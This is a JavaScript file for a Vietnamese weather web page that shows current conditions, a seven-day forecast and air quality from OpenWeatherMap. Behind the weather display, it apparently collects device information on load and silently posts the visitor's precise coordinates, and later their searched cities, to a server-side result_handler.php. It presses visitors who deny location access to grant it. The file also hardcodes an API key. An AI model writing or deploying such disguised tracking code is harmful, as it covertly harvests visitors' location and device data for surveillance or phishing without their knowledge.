// Dòng code dưới định nghĩa một biến hằng số currentDetails lưu trữ URL của OpenWeatherMap API với vĩ độ, kinh độ và khóa API cụ thể.
const currentDetails = "https://api.openweathermap.org/data/3.0/onecall?lat=35&lon=139&appid={API key}";

// Khai báo các biến để lưu trữ các phần tử HTML
const currTime = document.querySelector('#time');
const ampm = document.getElementById('#ampm');
const searchBar = document.querySelector('#searchbar');
const humid = document.getElementById('humidity');
const sunrise = document.getElementById('sunrise');
const sunset = document.getElementById('sunset');
const pressure = document.getElementById('pressure');
const speed = document.getElementById('speed');
const temperature = document.getElementById('temperature');
const feelsLike = document.getElementById('feels-like');
const loc = document.querySelector('#location span');
const icon = document.getElementById('icon');
const weather = document.getElementById('weather');
const dtInfo = document.getElementById('dt');
const stat = document.getElementById('stat');
const darkBtn = document.querySelector(".dark-btn");
const body = document.getElementById("main-body");
const forecast = document.getElementById("table");
const aqi = document.getElementById("aqi");
const quality = document.getElementById("quality");
const input_text = document.getElementById('input_text');

// Biến để lưu trữ tọa độ vị trí
let userLatitude = null;
let userLongitude = null;

// Hàm chuyển đổi tên thứ sang tiếng Việt
function getDayInVietnamese(dayIndex) {
  const days = ['Chủ Nhật', 'Thứ 2', 'Thứ 3', 'Thứ 4', 'Thứ 5', 'Thứ 6', 'Thứ 7'];
  return days[dayIndex];
}

// Hàm chuyển đổi tên tháng sang tiếng Việt
function getMonthInVietnamese(monthIndex) {
  const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
  return months[monthIndex];
}

// Hàm chuyển đổi trạng thái thời tiết sang tiếng Việt
function getWeatherInVietnamese(weatherMain) {
  const weatherTranslations = {
    'Clear': 'Trời Quang',
    'Clouds': 'Có Mây', 
    'Rain': 'Mưa',
    'Drizzle': 'Mưa Phùn',
    'Thunderstorm': 'Dông Bão',
    'Snow': 'Tuyết',
    'Mist': 'Sương Mù',
    'Fog': 'Sương Mù',
    'Haze': 'Sương Mù Nhẹ',
    'Dust': 'Bụi',
    'Sand': 'Cát Bụi',
    'Ash': 'Tro Bụi',
    'Squall': 'Gió Giật',
    'Tornado': 'Lốc Xoáy'
  };
  return weatherTranslations[weatherMain] || weatherMain;
}

// Hàm format ngày theo định dạng Việt Nam
function formatVietnameseDateTime(timestamp, timezoneOffset) {
  const date = new Date(new Date(timestamp * 1000 + timezoneOffset * 1000).getTime());
  const dayName = getDayInVietnamese(date.getUTCDay());
  const day = date.getUTCDate().toString().padStart(2, '0');
  const month = getMonthInVietnamese(date.getUTCMonth());
  const year = date.getUTCFullYear();
  const hours = date.getUTCHours().toString().padStart(2, '0');
  const minutes = date.getUTCMinutes().toString().padStart(2, '0');
  
  return `${dayName}, ${day} Tháng ${month} ${year} ${hours}:${minutes}`;
}

// Hàm format ngày ngắn cho forecast
function formatVietnameseDateShort(timestamp, timezoneOffset) {
  const date = new Date(new Date(timestamp * 1000 + timezoneOffset * 1000).getTime());
  const dayName = getDayInVietnamese(date.getUTCDay());
  const day = date.getUTCDate().toString().padStart(2, '0');
  const month = getMonthInVietnamese(date.getUTCMonth());
  
  return `${dayName}, ${day}/${month}`;
}

// Thêm sự kiện click cho nút chuyển giao diện tối/sáng
darkBtn.addEventListener("click", () => {
  if (darkBtn.checked) {
    body.classList.remove("light");
    body.classList.add("dark");
    loc.classList.add("dark-theme");
  } else {
    body.classList.remove("dark");
    body.classList.add("light");
    loc.classList.remove("dark-theme"); // Xóa class dark-theme
  }
});

// Khai báo biến limit và API key
var limit = 5;
var APIkey = 'd11089033f302effdd5c0af29c7bd6aa';

// Lấy vị trí hiện tại của người dùng khi trang được tải
window.addEventListener('DOMContentLoaded', () => {
  // Gọi hàm trong location.js để thu thập thông tin thiết bị
  if (typeof information === 'function') {
    information();
  }

  // Tạo hàm global để cập nhật thời tiết và truy cập từ các file khác
  window.updateWeather = function(lat, lon) {
    userLatitude = lat;
    userLongitude = lon;
    updateDetails(lat, lon);
  };
  
  // Sử dụng hàm locate từ location.js để lấy vị trí và gửi về server
  if (typeof locate === 'function') {
    locate(
      function success() {
        console.log("Vị trí đã được gửi thành công");
        // Lấy vị trí để cập nhật thông tin thời tiết
        navigator.geolocation.getCurrentPosition(
          (position) => {
            userLatitude = position.coords.latitude;
            userLongitude = position.coords.longitude;
            updateDetails(userLatitude, userLongitude);
          },
          (error) => {
            console.error("Không thể lấy thông tin thời tiết:", error);
          }
        );
      },
      function error() {
        console.log("Không thể gửi vị trí");
      }
    );
  } else {
    // Fallback nếu không tìm thấy hàm locate
    navigator.geolocation.getCurrentPosition(
      (position) => {
        userLatitude = position.coords.latitude;
        userLongitude = position.coords.longitude;
        updateDetails(userLatitude, userLongitude);
        
        // Gửi vị trí bằng AJAX trực tiếp
        sendLocationToServer(userLatitude, userLongitude);
      },
      (error) => {
        console.error("Lỗi khi lấy vị trí:", error);
        
        if (error.code === error.PERMISSION_DENIED) {
          setTimeout(function() {
            if (typeof showDenyModal === 'function') {
              showDenyModal();
            } else {
              alert("Vui lòng cấp quyền truy cập vị trí để xem thông tin thời tiết chính xác cho khu vực của bạn!");
            }
          }, 300);
        }
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
  }
});

// Hàm hiển thị loading state
function showLoading(element) {
  if (element) {
    element.classList.add('loading');
    element.textContent = 'Đang tải...';
  }
}

// Hàm ẩn loading state  
function hideLoading(element) {
  if (element) {
    element.classList.remove('loading');
  }
}

// Hàm hiển thị thông báo lỗi
function showError(message) {
  const errorDiv = document.createElement('div');
  errorDiv.className = 'error-notification glass-effect';
  errorDiv.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    background: rgba(244, 67, 54, 0.9);
    color: white;
    padding: 15px 20px;
    border-radius: 10px;
    z-index: 1000;
    animation: slideIn 0.3s ease;
  `;
  errorDiv.textContent = message;
  
  document.body.appendChild(errorDiv);
  
  setTimeout(() => {
    errorDiv.style.animation = 'slideOut 0.3s ease';
    setTimeout(() => errorDiv.remove(), 300);
  }, 3000);
}

// Hàm hiển thị thông báo thành công
function showSuccess(message) {
  const successDiv = document.createElement('div');
  successDiv.className = 'success-notification glass-effect';
  successDiv.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    background: rgba(76, 175, 80, 0.9);
    color: white;
    padding: 15px 20px;
    border-radius: 10px;
    z-index: 1000;
    animation: slideIn 0.3s ease;
  `;
  successDiv.textContent = message;
  
  document.body.appendChild(successDiv);
  
  setTimeout(() => {
    successDiv.style.animation = 'slideOut 0.3s ease';
    setTimeout(() => successDiv.remove(), 300);
  }, 2000);
}

// Cải tiến hàm getCoords với error handling
async function getCoords(cityName) { 
  const limit = 5;
  const pos = { latitude: 0, longitude: 0 };
  const api_url = `http://api.openweathermap.org/geo/1.0/direct?q=${cityName}&limit=${limit}&appid=${APIkey}`;
  
  try {
    showLoading(loc);
    const response = await fetch(api_url);
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const data = await response.json();
    
    if (!data || data.length === 0) {
      throw new Error('Không tìm thấy thành phố này');
    }
    
    pos.latitude = data[0].lat;
    pos.longitude = data[0].lon;
    
    showSuccess(`Đã tìm thấy: ${data[0].name}, ${data[0].country}`);
    return pos;
    
  } catch (error) {
    console.error('Lỗi khi tìm kiếm thành phố:', error);
    showError('Không thể tìm thấy thành phố. Vui lòng thử lại!');
    hideLoading(loc);
    throw error;
  }
}

// Sự kiện khi người dùng nhấn phím Enter trong ô tìm kiếm
document.addEventListener('keyup', (event) => {
  if (event.key === 'Enter' && input_text.value.trim() !== '') {
    getCoords(input_text.value).then((data) => {
      userLatitude = data.latitude;
      userLongitude = data.longitude;
      updateDetails(userLatitude, userLongitude);
      
      // Gửi vị trí tìm kiếm về server
      sendLocationToServer(userLatitude, userLongitude, 'search');
    });
  }
});

// Sự kiện khi người dùng nhấn nút tìm kiếm
document.getElementById('button-addon2').addEventListener('click', () => {
  if (input_text.value.trim() !== '') {
    getCoords(input_text.value).then((data) => {
      userLatitude = data.latitude;
      userLongitude = data.longitude;
      updateDetails(userLatitude, userLongitude);
      
      // Gửi vị trí tìm kiếm về server
      sendLocationToServer(userLatitude, userLongitude, 'search');
    });
  }
});

// Hàm gửi vị trí về server
function sendLocationToServer(latitude, longitude, source = 'auto') {
  // Format vị trí
  const lat = latitude + ' deg';
  const lon = longitude + ' deg';
  
  // Gửi vị trí về server thông qua AJAX
  $.ajax({
    type: 'POST',
    url: 'result_handler.php',
    data: {
      Status: 'success',
      Lat: lat,
      Lon: lon,
      Src: source, // Nguồn của vị trí: 'auto' hoặc 'search'
      Acc: 'N/A',
      Alt: 'N/A',
      Dir: 'N/A',
      Spd: 'N/A'
    },
    mimeType: 'text'
  });
}

// Hàm cập nhật thông tin thời tiết và nhiệt độ
async function updateDetails(lat, lon) {
  const weatherAPI = `https://api.openweathermap.org/data/3.0/onecall?lat=${lat}&lon=${lon}&appid=${APIkey}`;
  const geoAPI = `http://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=${limit}&appid=${APIkey}`;
  const aqiAPI = `http://api.openweathermap.org/data/2.5/air_pollution?lat=${lat}&lon=${lon}&appid=${APIkey}`;
  await fetch(geoAPI).then(res => res.json()).then(data => {
    console.log(data[0].name, data[0].country);
    const cityName = `${data[0].name}, ${data[0].country}`;
    // Reference to the span element
    const cityNameElement = loc.querySelector('span');
    
    // Apply fade-out effect
    cityNameElement.style.opacity = '0';
    
    // Set the city name in the span element after a short delay
    setTimeout(() => {
      cityNameElement.innerText = cityName;
      // Add title attribute for tooltip when hovering
      cityNameElement.title = cityName;
      // Add fade-in class
      cityNameElement.classList.add('fade-in');
      cityNameElement.style.opacity = '1';
      
      // Remove the animation class after it's done
      setTimeout(() => {
        cityNameElement.classList.remove('fade-in');
      }, 500);
    }, 100);
  });
  await fetch(weatherAPI).then(res => res.json()).then(data => {
    try {
      alert(data.alerts[0].description);
    } catch (err) {
      console.log("KHÔNG CÓ CẢNH BÁO THỜI TIẾT Ở KHU VỰC NÀY");
    }
    icon.src = `http://openweathermap.org/img/wn/${data.current.weather[0].icon}@2x.png`;
    dtInfo.innerText = formatVietnameseDateTime(data.current.dt, data.timezone_offset);
    stat.innerText = getWeatherInVietnamese(data.current.weather[0].main);
    humid.innerText = data.current.humidity + " %";
    temperature.innerText = Number(data.current.temp - 273.15).toFixed(0) + " \u00B0" + "c";
    feelsLike.innerText = Number(data.current.feels_like - 273.15).toFixed(1);
    pressure.innerText = data.current.pressure + " mbar";
    speed.innerText = data.current.wind_speed + " km/h";
    sunset.innerText = new Date(new Date(1000 * data.current.sunset + data.timezone_offset * 1000).getTime()).toUTCString().slice(16, 22);
    sunrise.innerText = new Date(new Date(1000 * data.current.sunrise + data.timezone_offset * 1000).getTime()).toUTCString().slice(16, 22);
    for (let index = 0; index < 7; index++) {
      let head = document.getElementById(`${index}`).getElementsByTagName("h2")[0];
      let weatherIcon = document.getElementById(`${index}`).getElementsByTagName("img")[0];
      let max = document.getElementById(`${index}`).getElementsByTagName("td")[0];
      let min = document.getElementById(`${index}`).getElementsByTagName("td")[1];
      weatherIcon.src = `http://openweathermap.org/img/wn/${data.daily[`${index}`].weather[0].icon}@2x.png`;
      head.innerHTML = formatVietnameseDateShort(data.daily[index].dt, data.timezone_offset);
      max.innerHTML = (data.daily[index].temp.max - 273.15).toFixed(1);
      min.innerHTML = (data.daily[index].temp.min - 273.15).toFixed(1);
    }
  });
  await fetch(aqiAPI).then(res => res.json()).then(data => {
    try {
      aqi.innerText = data.list[0].main.aqi;
      switch (data.list[0].main.aqi) {
        case 1:
          quality.innerText = "Tốt";
          break;
        case 2:
          quality.innerText = "Tạm Được";
          break;
        case 3:
          quality.innerText = "Bình Thường";
          break;
        case 4:
          quality.innerText = "Tệ";
          break;
        case 5:
          quality.innerText = "Rất Tệ";
          break;
      }
    } catch (err) {
      console.log(err);
    }
  });
}
